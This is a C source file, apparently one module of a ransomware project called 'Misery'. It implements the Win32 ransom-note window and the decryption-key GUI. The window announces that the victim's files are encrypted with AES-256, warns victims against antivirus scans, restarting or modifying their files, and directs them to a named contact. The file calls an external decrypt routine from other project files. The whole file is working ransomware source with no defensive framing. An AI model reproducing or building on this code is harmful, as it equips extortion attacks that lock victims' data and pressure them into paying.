/* 
 * ransomnote.c  —  Native Win32 Ransom Note Window + Decrypt GUI
 * Compiles with MinGW GCC. Call ShowRansomNoteWindow() to display.
 *  */

#include <windows.h>
#include <commctrl.h>
#include <stdio.h>
#include <process.h>   /* for _beginthreadex */
#include "fileops.h"
#include "misery_config.h"

/* ── Colour palette ── */
#define CLR_BG          RGB(245, 225, 225)
#define CLR_BANNER_BG   RGB(40,   8,   8)
#define CLR_ACCENT      RGB(60, 160,  80)
#define CLR_ACCENT_DARK RGB(35, 110,  50)
#define CLR_HEADLINE    RGB(220,  80,  80)
#define CLR_WHITE       RGB(248, 248, 248)
#define CLR_CARD_BG     RGB(50,  12,  12)
#define CLR_CARD_TEXT   RGB(230, 200, 200)
#define CLR_BODY_TEXT   RGB(30,  15,  15)
#define CLR_CODE_BG     RGB(235, 252, 235)
#define CLR_DECRYPT_BG  RGB(225, 240, 225)

#define WC_RANSOM   L"MiseryRansomNote"
#define WIN_TITLE   L"MISERY - Security Event"

/* ── Control IDs ── */
#define IDC_CLOSE       1001
#define IDC_DECRYPT_KEY 1002
#define IDC_DECRYPT_BTN 1003
#define IDC_STATUS      1004

/* Custom window message for decrypt thread completion */
#define WM_DECRYPT_DONE (WM_APP + 1)

/* ── Brushes and fonts ── */
static HBRUSH  g_hbrBanner    = NULL;
static HBRUSH  g_hbrBg        = NULL;
static HBRUSH  g_hbrCard      = NULL;
static HBRUSH  g_hbrAccent    = NULL;
static HBRUSH  g_hbrCodeBg    = NULL;
static HBRUSH  g_hbrDecryptBg = NULL;
static HFONT   g_hFontHead    = NULL;
static HFONT   g_hFontSub     = NULL;
static HFONT   g_hFontBody    = NULL;
static HFONT   g_hFontSmall   = NULL;
static HFONT   g_hFontMono    = NULL;
static HFONT   g_hFontName    = NULL;

static LRESULT CALLBACK RansomWndProc(HWND, UINT, WPARAM, LPARAM);
static void     CreateResources(void);
static void     DestroyResources(void);
void ShowRansomNoteWindow(void);

/* ── Decrypt thread parameter ── */
typedef struct {
    char  key[256];
    HWND  hWnd;
} DECRYPT_THREAD_PARAMS;

/* ── Forward declaration of the decrypt function (from misery.c) ── */
extern bool MiseryRunDecrypt(const char *key, FILEOPS_STATS *outStats);
extern const char *g_target_dirs[];

/* ═══════════════════════════════════════════════════════════════
 * Decrypt worker thread
 * ═══════════════════════════════════════════════════════════════ */
static unsigned int __stdcall DecryptThreadProc(void *lpParam) {
    DECRYPT_THREAD_PARAMS *p = (DECRYPT_THREAD_PARAMS *)lpParam;
    FILEOPS_STATS stats = {0};

    BOOL success = MiseryRunDecrypt(p->key, &stats);

    /* Post result back to GUI window */
    if (p->hWnd && IsWindow(p->hWnd)) {
        PostMessage(p->hWnd, WM_DECRYPT_DONE,
                    (WPARAM)(success ? stats.filesSucceeded : -1),
                    (LPARAM)(success ? stats.filesFailed : 0));
    }

    free(p);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════
 * Show the ransom note window (blocking)
 * ═══════════════════════════════════════════════════════════════ */
void ShowRansomNoteWindow(void) {
    HMODULE hInst = GetModuleHandle(NULL);
    INITCOMMONCONTROLSEX icc = { sizeof(icc), ICC_WIN95_CLASSES };
    InitCommonControlsEx(&icc);

    CreateResources();

    WNDCLASSEXW wc;
    ZeroMemory(&wc, sizeof(wc));
    wc.cbSize        = sizeof(wc);
    wc.lpfnWndProc   = RansomWndProc;
    wc.hInstance     = hInst;
    wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
    wc.hbrBackground = g_hbrBg;
    wc.lpszClassName = WC_RANSOM;
    RegisterClassExW(&wc);

    int winW = 860, winH = 700;  /* taller to fit decrypt section */
    int scrW = GetSystemMetrics(SM_CXSCREEN);
    int scrH = GetSystemMetrics(SM_CYSCREEN);
    int posX = (scrW - winW) / 2;
    int posY = (scrH - winH) / 2;

    HWND hWnd = CreateWindowExW(
        WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
        WC_RANSOM, WIN_TITLE,
        WS_POPUP | WS_CAPTION | WS_SYSMENU,
        posX, posY, winW, winH,
        NULL, NULL, hInst, NULL
    );

    if (!hWnd) { DestroyResources(); return; }

    ShowWindow(hWnd, SW_SHOW);
    UpdateWindow(hWnd);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    DestroyResources();
}

/* ═══════════════════════════════════════════════════════════════
 * WINDOW PROC
 * ═══════════════════════════════════════════════════════════════ */
static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {

    case WM_CREATE: {
        HINSTANCE hInst = (HINSTANCE)GetWindowLongPtrW(hWnd, GWLP_HINSTANCE);

        /* ── Banner (dark red top panel) ── */
        HWND hBanner = CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
            0, 0, 860, 170, hWnd, NULL, hInst, NULL);

        /* Accent stripe */
        CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
            0, 0, 860, 5, hBanner, NULL, hInst, NULL);

        /* Lock icon */
        CreateWindowExW(0, L"STATIC", L"\U0001F512", WS_CHILD | WS_VISIBLE,
            30, 20, 60, 50, hBanner, NULL, hInst, NULL);

        /* Headline */
        CreateWindowExW(0, L"STATIC", L"YOUR FILES HAVE BEEN ENCRYPTED",
            WS_CHILD | WS_VISIBLE, 100, 18, 700, 40, hBanner, NULL, hInst, NULL);

        /* Sub-line */
        CreateWindowExW(0, L"STATIC",
            L"All your documents, images, databases, and source code "
            L"have been locked with AES-256 encryption.",
            WS_CHILD | WS_VISIBLE, 100, 60, 700, 22, hBanner, NULL, hInst, NULL);

        /* Status badge */
        CreateWindowExW(0, L"STATIC", L"  \u2713  ENCRYPTION COMPLETE  ",
            WS_CHILD | WS_VISIBLE | SS_CENTERIMAGE,
            100, 92, 240, 28, hBanner, NULL, hInst, NULL);

        /* ── Instructions body ── */
        const WCHAR *instructions =
            L"═══════════════════════════════════════════════\n"
            L"  INSTRUCTIONS TO RECOVER YOUR FILES\n"
            L"═══════════════════════════════════════════════\n\n"
            L"  \u2705  DO NOT attempt to decrypt files yourself \u2014 any\n"
            L"      modification will cause permanent data loss. The\n"
            L"      encryption is AES-256-CBC with HMAC-SHA256.\n\n"
            L"  \u2705  DO NOT run antivirus scans that may delete the\n"
            L"      decryption key file \"misery.key\".\n\n"
            L"  \u2705  DO NOT shut down or restart your computer before\n"
            L"      contacting the security researcher below.\n\n"
            L"  \u2705  Contact the researcher immediately with your\n"
            L"      Reference Code to begin decryption.\n\n"
            L"  \u26A0  Any attempt to reverse or modify encrypted files\n"
            L"      without the correct key will result in\n"
            L"      IRREVERSIBLE DATA LOSS.";

        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", instructions,
            WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY |
            ES_AUTOVSCROLL | ES_LEFT,
            30, 185, 800, 170, hWnd, NULL, hInst, NULL);

        /* ── Contact card ── */
        HWND hCard = CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE, 30, 370, 800, 85, hWnd, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
            0, 0, 5, 85, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"SECURITY RESEARCHER",
            WS_CHILD | WS_VISIBLE, 20, 8, 300, 18, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC", L"Jahanzaib Ashraf Mir",
            WS_CHILD | WS_VISIBLE, 20, 28, 500, 32, hCard, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC",
            L"Cybersec Engineer  |  Hacker  |  Malware Researcher",
            WS_CHILD | WS_VISIBLE, 20, 62, 500, 20, hCard, NULL, hInst, NULL);

        /* ── Decryption Section ── */
        HWND hDecryptPanel = CreateWindowExW(0, L"STATIC", NULL,
            WS_CHILD | WS_VISIBLE | SS_NOTIFY,
            30, 470, 800, 120, hWnd, NULL, hInst, NULL);

        /* Decrypt section label */
        CreateWindowExW(0, L"STATIC", L"\u26A0  DECRYPTION UTILITY",
            WS_CHILD | WS_VISIBLE,
            15, 5, 300, 22, hDecryptPanel, NULL, hInst, NULL);

        CreateWindowExW(0, L"STATIC",
            L"Enter the decryption key to recover your files:",
            WS_CHILD | WS_VISIBLE,
            15, 30, 400, 18, hDecryptPanel, NULL, hInst, NULL);

        /* Key input field */
        HWND hKeyEdit = CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", L"",
            WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL | WS_TABSTOP,
            15, 52, 500, 26, hDecryptPanel, (HMENU)IDC_DECRYPT_KEY, hInst, NULL);

        /* Send EM_LIMITTEXT to cap at 64 chars */
        SendMessage(hKeyEdit, EM_LIMITTEXT, 64, 0);

        /* Decrypt button */
        CreateWindowExW(0, L"BUTTON", L"DECRYPT FILES",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
            530, 50, 140, 30, hDecryptPanel, (HMENU)IDC_DECRYPT_BTN, hInst, NULL);

        /* Status text (initially hidden/empty) */
        CreateWindowExW(0, L"STATIC", L"",
            WS_CHILD | WS_VISIBLE,
            15, 88, 600, 24, hDecryptPanel, (HMENU)IDC_STATUS, hInst, NULL);

        /* ── Reference code footer ── */
        WCHAR refBuf[512];
        wcscpy(refBuf, L"Reference Code:  MISERY-XXXX-XXXX-XXXX\n");
        wcscat(refBuf, L"Key File:        C:\\Users\\[USER]\\Desktop\\misery.key\n");
        wcscat(refBuf, L"Algorithm:       AES-256-CBC  +  HMAC-SHA256");

        CreateWindowExW(WS_EX_CLIENTEDGE, L"EDIT", refBuf,
            WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_READONLY | ES_LEFT,
            30, 605, 800, 50, hWnd, NULL, hInst, NULL);

        /* ── Close button ── */
        CreateWindowExW(0, L"BUTTON", L"  CLOSE  ",
            WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON | WS_TABSTOP,
            690, 610, 130, 45, hWnd, (HMENU)IDC_CLOSE, hInst, NULL);

        return 0;
    }

    /* ── Colour all controls ── */
    case WM_CTLCOLORSTATIC: {
        HDC     hdc = (HDC)wParam;
        HWND    hCtrl = (HWND)lParam;
        WCHAR   winText[128] = {0};

        GetWindowTextW(hCtrl, winText, 128);

        if (wcsstr(winText, L"YOUR FILES HAVE BEEN ENCRYPTED")) {
            SetTextColor(hdc, CLR_HEADLINE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontHead);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"All your documents")) {
            SetTextColor(hdc, RGB(200, 170, 170));
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontSub);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"ENCRYPTION COMPLETE")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_ACCENT_DARK);
            SelectObject(hdc, g_hFontSmall);
            return (LRESULT)g_hbrAccent;
        }
        if (wcsstr(winText, L"SECURITY RESEARCHER")) {
            SetTextColor(hdc, CLR_ACCENT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"Jahanzaib Ashraf Mir")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontName);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"Cybersec Engineer")) {
            SetTextColor(hdc, CLR_CARD_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"\U0001F512")) {
            SetTextColor(hdc, CLR_ACCENT);
            SetBkMode(hdc, TRANSPARENT);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"DECRYPTION UTILITY")) {
            SetTextColor(hdc, CLR_HEADLINE);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }
        if (wcsstr(winText, L"Enter the decryption key")) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkMode(hdc, TRANSPARENT);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
        }

        /* Default for other STATIC controls (status text, etc.) */
        SetTextColor(hdc, CLR_BODY_TEXT);
        SetBkMode(hdc, TRANSPARENT);
        SelectObject(hdc, g_hFontBody);
        return (LRESULT)(HBRUSH)GetStockObject(NULL_BRUSH);
    }

    case WM_CTLCOLOREDIT: {
        HDC hdc = (HDC)wParam;
        HWND hCtrl = (HWND)lParam;
        WCHAR winText[256] = {0};
        GetWindowTextW(hCtrl, winText, 256);

        if (wcsstr(winText, L"INSTRUCTIONS")) {
            SetTextColor(hdc, CLR_BODY_TEXT);
            SetBkColor(hdc, CLR_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrBg;
        }
        if (wcsstr(winText, L"Reference Code:")) {
            SetTextColor(hdc, RGB(20, 60, 20));
            SetBkColor(hdc, CLR_CODE_BG);
            SelectObject(hdc, g_hFontMono);
            return (LRESULT)g_hbrCodeBg;
        }
        /* Decryption key edit control - light green background */
        SetTextColor(hdc, RGB(0, 40, 0));
        SetBkColor(hdc, CLR_DECRYPT_BG);
        SelectObject(hdc, g_hFontMono);
        return (LRESULT)g_hbrDecryptBg;
    }

    case WM_CTLCOLORBTN: {
        HDC hdc = (HDC)wParam;
        HWND hCtrl = (HWND)lParam;
        WCHAR btnText[32] = {0};
        GetWindowTextW(hCtrl, btnText, 32);

        if (wcsstr(btnText, L"CLOSE")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_HEADLINE);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)CreateSolidBrush(CLR_HEADLINE);
        }
        if (wcsstr(btnText, L"DECRYPT")) {
            SetTextColor(hdc, CLR_WHITE);
            SetBkColor(hdc, CLR_ACCENT_DARK);
            SelectObject(hdc, g_hFontBody);
            return (LRESULT)g_hbrAccent;
        }
        return DefWindowProcW(hWnd, msg, wParam, lParam);
    }

    case WM_COMMAND:
        if (LOWORD(wParam) == IDC_CLOSE) {
            DestroyWindow(hWnd);
            PostQuitMessage(0);
            return 0;
        }

        if (LOWORD(wParam) == IDC_DECRYPT_BTN) {
            /* Get the key from the edit control */
            HWND hKeyEdit = GetDlgItem(hWnd, IDC_DECRYPT_KEY);
            HWND hStatus  = GetDlgItem(hWnd, IDC_STATUS);

            WCHAR keyWide[128] = {0};
            GetWindowTextW(hKeyEdit, keyWide, 128);

            /* Convert to narrow (UTF-8) */
            char key[256] = {0};
            WideCharToMultiByte(CP_UTF8, 0, keyWide, -1, key, sizeof(key), NULL, NULL);

            if (strlen(key) == 0) {
                SetWindowTextA(hStatus, "Please enter a decryption key.");
                return 0;
            }

            /* Disable button and show status */
            EnableWindow(GetDlgItem(hWnd, IDC_DECRYPT_BTN), FALSE);
            SetWindowTextA(hStatus, "Decrypting files... please wait.");

            /* Spawn decryption thread */
            DECRYPT_THREAD_PARAMS *params = (DECRYPT_THREAD_PARAMS *)
                malloc(sizeof(DECRYPT_THREAD_PARAMS));
            if (params) {
                strncpy(params->key, key, sizeof(params->key) - 1);
                params->key[sizeof(params->key) - 1] = '\0';
                params->hWnd = hWnd;
                HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, DecryptThreadProc, params, 0, NULL);
                if (hThread) {
                    CloseHandle(hThread);
                } else {
                    free(params);
                    SetWindowTextA(hStatus, "Failed to start decryption thread.");
                    EnableWindow(GetDlgItem(hWnd, IDC_DECRYPT_BTN), TRUE);
                }
            }
            return 0;
        }
        break;

    case WM_DECRYPT_DONE: {
        /* Decrypt thread reported back */
        HWND hStatus = GetDlgItem(hWnd, IDC_STATUS);
        LONGLONG succeeded = (LONGLONG)wParam;
        LONGLONG failed = (LONGLONG)lParam;

        char msgBuf[256];
        if (succeeded == -1) {
            /* MiseryRunDecrypt returned false — wrong key */
            snprintf(msgBuf, sizeof(msgBuf),
                "Decryption FAILED: The key is incorrect. No files were recovered.");
        } else if (failed == 0 && succeeded == 0) {
            snprintf(msgBuf, sizeof(msgBuf),
                "No encrypted files were found. Nothing to decrypt.");
        } else {
            snprintf(msgBuf, sizeof(msgBuf),
                "Decryption complete: %lld files recovered, %lld failed.",
                succeeded, failed);
        }

        SetWindowTextA(hStatus, msgBuf);
        EnableWindow(GetDlgItem(hWnd, IDC_DECRYPT_BTN), TRUE);

        /* Also show a popup */
        MessageBoxA(hWnd, msgBuf, "Decryption Result", MB_OK | MB_ICONINFORMATION);
        return 0;
    }

    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }

    return DefWindowProcW(hWnd, msg, wParam, lParam);
}

/* ═══════════════════════════════════════════════════════════════
 * RESOURCE CREATION
 * ═══════════════════════════════════════════════════════════════ */
static void CreateResources(void) {
    g_hbrBanner  = CreateSolidBrush(CLR_BANNER_BG);
    g_hbrBg      = CreateSolidBrush(CLR_BG);
    g_hbrCard    = CreateSolidBrush(CLR_CARD_BG);
    g_hbrAccent  = CreateSolidBrush(CLR_ACCENT_DARK);
    g_hbrCodeBg  = CreateSolidBrush(CLR_CODE_BG);
    g_hbrDecryptBg = CreateSolidBrush(CLR_DECRYPT_BG);

    LOGFONTW lf;
    ZeroMemory(&lf, sizeof(lf));

    lf.lfHeight  = -26; lf.lfWeight = FW_BOLD;
    lf.lfQuality = CLEARTYPE_QUALITY;
    wcscpy(lf.lfFaceName, L"Segoe UI");
    g_hFontHead = CreateFontIndirectW(&lf);

    lf.lfHeight = -14; lf.lfWeight = FW_NORMAL;
    g_hFontSub = CreateFontIndirectW(&lf);

    lf.lfHeight = -13;
    g_hFontBody = CreateFontIndirectW(&lf);

    lf.lfHeight = -11; lf.lfWeight = FW_BOLD;
    g_hFontSmall = CreateFontIndirectW(&lf);

    lf.lfHeight = -12; lf.lfWeight = FW_NORMAL;
    wcscpy(lf.lfFaceName, L"Consolas");
    g_hFontMono = CreateFontIndirectW(&lf);

    lf.lfHeight = -22; lf.lfWeight = FW_BOLD;
    wcscpy(lf.lfFaceName, L"Segoe UI");
    g_hFontName = CreateFontIndirectW(&lf);
}

static void DestroyResources(void) {
    if (g_hbrBanner)   DeleteObject(g_hbrBanner);
    if (g_hbrBg)       DeleteObject(g_hbrBg);
    if (g_hbrCard)     DeleteObject(g_hbrCard);
    if (g_hbrAccent)   DeleteObject(g_hbrAccent);
    if (g_hbrCodeBg)   DeleteObject(g_hbrCodeBg);
    if (g_hbrDecryptBg) DeleteObject(g_hbrDecryptBg);
    if (g_hFontHead)   DeleteObject(g_hFontHead);
    if (g_hFontSub)    DeleteObject(g_hFontSub);
    if (g_hFontBody)   DeleteObject(g_hFontBody);
    if (g_hFontSmall)  DeleteObject(g_hFontSmall);
    if (g_hFontMono)   DeleteObject(g_hFontMono);
    if (g_hFontName)   DeleteObject(g_hFontName);
}